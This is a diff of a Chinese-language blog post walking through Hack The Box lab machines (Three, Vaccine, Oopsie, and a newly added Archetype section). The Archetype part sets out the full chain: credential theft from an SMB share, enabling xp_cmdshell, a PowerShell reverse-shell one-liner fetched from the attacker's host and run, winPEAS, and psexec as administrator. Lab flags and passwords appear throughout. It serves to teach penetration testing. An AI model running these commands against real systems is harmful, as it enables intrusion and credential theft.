@@ -10,9 +10,7 @@ draft: false
 
 # 靶场通关记录
 
-# 靶场：Three
-
-Target IP Address目标IP地址：10.129.227.248
+# 靶场：Three(Linux)
 
 ## Task 1
 
@@ -234,7 +232,7 @@ url：`http://thetoppers.htb/webshell.php?cmd=cat ../flag.txt`，拿到flag
 
 answer：a980d99281a28d638ac68b9bf9453c2b
 
-# 靶场：Vaccine
+# 靶场：Vaccine(Linux)
 
 ## Task 1
 
@@ -635,7 +633,7 @@ Task 7 answer：vi
 
 Task 9 answer：dd6e058e814260bc70e9bbdef2715849
 
-# 靶场：Oopsie
+# 靶场：Oopsie(Linux)
 
 ## Task 1
 
@@ -719,7 +717,7 @@ On uploading a file, what directory does that file appear in on the server?
 
 能文件上传的第一件事是干什么？！
 
-先挂个马再说，不行再换其他的
+先挂个马再说，不行再换其他的（经测试：上传之后最好在uploads目录下新建一个xxx文件夹，将webshell放在这个xxx文件夹中，避免webshell被程序删除）
 
 **注意**：上传的时候拦截数据包也需要修改身份，上传成功后提示` The file webshell.php has been uploaded. `，现在要做的就是找到该站的文件上传的具体路径，直接使用**Gobuster**
 
@@ -867,7 +865,7 @@ Task 9 answer：Set Owner User ID
 
 What is the name of the executable being called in an insecure manner?
 
-因为Robert属于bugtracker组，所以有执行权限，输入bugtracker执行该命令，并进行测试id（随意）
+因为Robert属于bugtracker组，所以有执行权限，输入bugtracker执行该命令，并进行测试id（随意），这里也可以通过`strings /usr/bin/bugtracker`，查看文件内容，其中就包括`cat /root/reports/`
 
 ```
 robert@oopsie:/$ bugtracker
@@ -897,7 +895,7 @@ robert@oopsie:/$ echo $PATH
 
 **流程**：
 1. robert 执行 /usr/bin/bugtracker
-2. bugtracker 程序内部执行 system("cat /root/flag.txt")  // 没有绝对路径
+2. bugtracker 程序内部执行 system("cat /root/flag.txt")    // 没有绝对路径
 3. 系统查找 cat:/tmp/cat 找到了（因为 PATH 优先）
 4. 执行 /tmp/cat，实际执行的是 /bin/sh
 5. 因为 bugtracker 是 SUID root，/tmp/cat 继承 root 权限
@@ -934,7 +932,7 @@ reports  root.txt
 # more root.txt
 af13b0bee69f8a877c3faf667f7beacf
 
-// 最后突然发现还有个Robert主目录的flag
+// 最后突然发现还需要提交Robert主目录的flag
 # more /home/robert/user.txt
 f2c74ee8db7983851ab2a96a44eb7981
 
@@ -945,3 +943,373 @@ answer：cat
 Robert answer：f2c74ee8db7983851ab2a96a44eb7981
 
 Root answer：af13b0bee69f8a877c3faf667f7beacf
+
+# 靶场：Archetype(Windows)
+
+因为接触Windows靶场比较少，所以把这次相关接口的小知识列举一下
+
+|    维度     |    445端口（SMB）     |     1433端口（MSSQL）      |
+| :-------: | :---------------: | :--------------------: |
+| **核心功能**  |     文件/打印机共享      |        数据库连接与查询        |
+| **操作系统**  |    Windows原生协议    |  数据库服务（需安装SQL Server）  |
+| **认证方式**  |   NTLM、Kerberos   |    SQL认证、Windows认证     |
+| **攻击入口**  |  共享枚举、漏洞利用、中继攻击   |     弱口令、SQL注入、存储过程     |
+| **攻击成功后** |    文件读写、远程命令执行    |      数据库控制、系统命令执行      |
+| **典型漏洞**  |   永恒之蓝、SMBGhost   |   xp_cmdshell提权、空密码    |
+| **防护措施**  | 禁用SMBv1、强制签名、限制IP | 强密码、禁用xp_cmdshell、限制IP |
+
+## Task 1
+
+Which TCP port is hosting a database server?
+
+直接nmap开扫，端口1433托管着sql服务器
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap -sC -sV 10.129.48.155
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-17 06:24 -0400
+Nmap scan report for 10.129.48.155
+Host is up (0.45s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+
+```
+
+answer：1433
+
+## Task 2
+
+What is the name of the non-Administrative share available over SMB?
+
+需要使用到工具smbclient
+
+Smbclient(samba client)是基于SMB协议的,用于存取共享目标的客户端程序。
+
+**参数**：仅列举了常用参数
+
+|                  参数                  |               作用                |
+| :----------------------------------: | :-----------------------------: |
+|                 `-L`                 |      列出目标主机的所有共享（最常用，第一步）       |
+|                 `-N`                 |           空密码登录（免交互）            |
+|                 `-U`                 | 指定用户名，格式：`-U 用户名` 或 `-U 用户名%密码` |
+|                 `-W`                 |       指定工作组/域名，如 `-W HTB`       |
+|                 `-P`                 |         指定端口（默认445，极少用）         |
+|                 `-c`                 | 执行单条命令后退出，如 `-c 'get user.txt'` |
+|                 `-I`                 |        指定目标IP（当解析有问题时用）         |
+|                 `-O`                 |          指定NetBIOS名称选项          |
+|                 `-m`                 |     指定SMB协议最大版本，如 `-m SMB2`     |
+| `--option="client min protocol=NT1"` |       强制降级到SMB1协议（兼容老机器）        |
+|                 `-d`                 |  调试模式，`-d 0`~`-d 10` 控制输出详细程度   |
+
+首先尝试查看445的共享能不能进行连接
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ smbclient -L 10.129.48.155
+Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backups         Disk      
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.48.155 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+```
+
+$结尾需要管理员权限，所以只能查看backups
+
+**解释**：
+
+|      协议/类型      |          路径格式           |                   示例                    |                  适用场景                   |
+| :-------------: | :---------------------: | :-------------------------------------: | :-------------------------------------: |
+|  **SMB/CIFS**   |       `//服务器/共享名`       |        `//10.129.48.155/backups`        | Linux下访问Windows共享（smbclient、mount.cifs） |
+| **Windows UNC** |       `\\服务器\共享名`       |        `\\10.129.48.155\backups`        |        Windows资源管理器、cmd命令行访问网络共享        |
+|    **本地文件**     |        `/路径/文件`         |          `/home/kali/backups`           |             Linux本地文件系统绝对路径             |
+| **HTTP/HTTPS**  |     `http://域名/路径`      |     `http://example.com/index.html`     |         Web浏览器、curl、wget访问网页资源          |
+|     **FTP**     |     `ftp://服务器/路径`      |       `ftp://192.168.1.1/files/`        |              FTP客户端下载/上传文件              |
+|  **SSH/SFTP**   |     `ssh://服务器/路径`      |    `ssh://user@10.0.0.1/home/user/`     |             SSH连接或SFTP文件传输              |
+|    **MySQL**    | `mysql://用户@服务器:端口/数据库` |   `mysql://root@localhost:3306/mydb`    |                数据库连接字符串                 |
+|    **MSSQL**    | `mssql://用户@服务器:端口/数据库` | `mssql://sa@10.129.48.155:1433/master`  |             SQL Server连接字符串             |
+|    **LDAP**     |     `ldap://服务器/路径`     | `ldap://192.168.1.10/dc=example,dc=com` |                 目录服务查询                  |
+|    **file**     |      `file:///路径`       |     `file:///home/kali/backup.sql`      |           本地文件URI格式（浏览器、某些程序）           |
+|  **SMB URL格式**  |     `smb://服务器/共享名`     |      `smb://10.129.48.155/backups`      |      完整SMB URI标准格式（GNOME/KDE文件管理器）      |
+| **Windows本地路径** |        `盘符:\路径`         |         `C:\Windows\System32\`          |              Windows本地文件系统              |
+
+answer：backups
+
+## Task 3
+
+What is the password identified in the file on the SMB share?
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ smbclient //10.129.48.155/backups
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Jan 20 07:20:57 2020
+  ..                                  D        0  Mon Jan 20 07:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
+
+                5056511 blocks of size 4096. 2618157 blocks available
+
+```
+
+下载到本地进行查看内容
+
+```
+smb: \> get prod.dtsConfig
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat prod.dtsConfig 
+<DTSConfiguration>
+    <DTSConfigurationHeading>
+        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
+    </DTSConfigurationHeading>
+    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+    </Configuration>
+</DTSConfiguration>      
+
+```
+
+answer：M3g4c0rp123
+
+## Task 4
+
+What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
+
+获取到`User ID=ARCHETYPE\sql_svc`以及`Password=M3g4c0rp123`，因为现在kali以及内置了impacket，所以直接使用，参数为**强制使用 Windows 认证**模式进行连接
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ impacket-mssqlclient sql_svc@10.129.48.155 -windows-auth
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
+[!] Press help for extra shell commands
+SQL (ARCHETYPE\sql_svc  dbo@master)> 
+
+```
+
+answer：mssqlclient.py
+
+## Task 5
+
+What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
+
+登录成功后，验证一下权限
+
+```  
+SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
+    
+-   
+1   
+SQL (ARCHETYPE\sql_svc  dbo@master)> 
+
+```
+
+回显为1，说明是sysadmin角色，拥有最高权限
+
+现在需要开启xp_cmdshell，因为它本质是SQL Server 内置的一个**系统存储过程**，它的作用是调用 Windows 的 `cmd.exe` 命令解释器，一般默认是关闭的，这里进行尝试一下，结果为关闭的
+
+**`xp_cmdshell` 就是 SQL Server 里的 "系统命令执行器"**，能让数据库像命令行一样执行 Windows 命令。
+
+```
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master.dbo.xp_cmdshell 'whoami'
+ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+
+```
+
+开启`xp_cmdshell`
+
+```
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options',1;                                    
+INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.                                                                                                    
+SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell',1;                                              
+INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.         SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
+
+```
+
+接下来就可以正常使用执行系统命令了
+
+```
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
+output              
+-----------------   
+archetype\sql_svc              
+NULL
+
+```
+
+answer：xp_cmdshell
+
+## Task 6/7
+
+Task 6 Q：What script can be used in order to search possible paths to escalate privileges on Windows hosts?
+Task 7 Q：What file contains the administrator's password?
+
+为了这个交互方式，获取一个完整的命令行窗口，准备使用Web下载+执行的方式，反弹一个shell给我的kali
+
+对攻击机的操作：
+
+在kali上生成一个反弹shell的脚本文件，之后启动HTTP服务
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ echo '$client = New-Object System.Net.Sockets.TCPClient("10.10.17.123",4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' > /tmp/winshell.ps1 
+
+┌──(kali㉿kali)-[/tmp]
+└─$ sudo python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+ 
+```
+
+对目标机的操作：
+
+在SQL会话中分步执行，先查看我们当前登录账号有权限读写的临时文件夹，然后进行下载
+
+```
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master.dbo.xp_cmdshell 'echo %TEMP%';
+output                                
+-----------------------------------   
+C:\Users\sql_svc\AppData\Local\Temp 
+NULL
+
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master.dbo.xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.17.123:8080/winshell.ps1 -OutFile C:\Users\sql_svc\AppData\Local\Temp\winshell.ps1"';
+output   
+------   
+NULL
+
+```
+
+当目标机下载完成后，攻击机这时就可以对端口进行监听了，目标机此时执行脚本文件
+
+对攻击机的操作：
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ nc -lvnp 4443
+listening on [any] 4443 ...
+connect to [10.10.17.123] from (UNKNOWN) [10.129.48.155] 49683
+
+// 此时就已经获得win-shell的界面了
+PS C:\Windows\system32> 
+
+```
+
+对目标机的操作：
+
+```
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master.dbo.xp_cmdshell 'powershell -ExecutionPolicy Bypass -File "C:\Users\sql_svc\AppData\Local\Temp\winshell.ps1"';
+
+```
+
+之后就拿到了我们的第一个flag
+
+```
+PS C:\users\sql_svc> cd C:\users\sql_svc\desktop
+PS C:\users\sql_svc\desktop> dir
+    Directory: C:\users\sql_svc\desktop
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-ar---        2/25/2020   6:37 AM             32 user.txt                                                              
+
+PS C:\users\sql_svc\desktop> type user.txt
+3e7b102e78218e935bf3f4951fec21a3
+
+```
+
+但是现在的问题是，权限不够，那么接下来该登场的是**窗户上的豌豆**，本地先下载好win版本的开启服务，之后让目标机下载
+
+对目标机的操作：
+
+```
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master.dbo.xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.17.123:8080/winPEAS.bat -OutFile C:\Users\sql_svc\Desktop\winPEAS.bat"';
+
+```
+
+对攻击机的操作：
+
+```
+// 因为我是直接从GitHub下载的，所以下载部分略过，直接启动HTTP服务
+┌──(kali㉿kali)-[/tmp]
+└─$ sudo python3 -m http.server 8080
+10.129.48.155 - - [17/Jun/2026 08:57:23] "GET /winPEAS.bat HTTP/1.1" 200 -
+
+```
+
+完成之后，接下来就是使用该脚本
+
+```
+PS C:\users\sql_svc\desktop> .\winPEAS.bat
+
+// 工具会帮我们列出可利用的信息，扫描完成后，其中会有一条信息说明PowerShell命令历史记录的保存点
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+// 打开该文件
+PS C:\users\sql_svc\desktop> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+
+```
+
+Task 6 answer：winpeas
+Task 7 answer：ConsoleHost_history.txt
+
+查看文件发现一个管理员的账号密码，使用impacket进行登录
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ impacket-psexec administrator@10.129.48.155  
+
+// 登录成功后
+c:\Users> cd c:\users\Administrator\desktop
+c:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of c:\Users\Administrator\Desktop
+
+07/27/2021  02:30 AM    <DIR>          .
+07/27/2021  02:30 AM    <DIR>          ..
+02/25/2020  07:36 AM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  10,717,081,600 bytes free
+
+c:\Users\Administrator\Desktop> type root.txt
+b91ccec3305e98240082d4474b848528
+
+```
+
+成功拿到flag
+
+sql_svc answer：3e7b102e78218e935bf3f4951fec21a3
+administrator answer：b91ccec3305e98240082d4474b848528
+
+
+
+
+
+
+
+
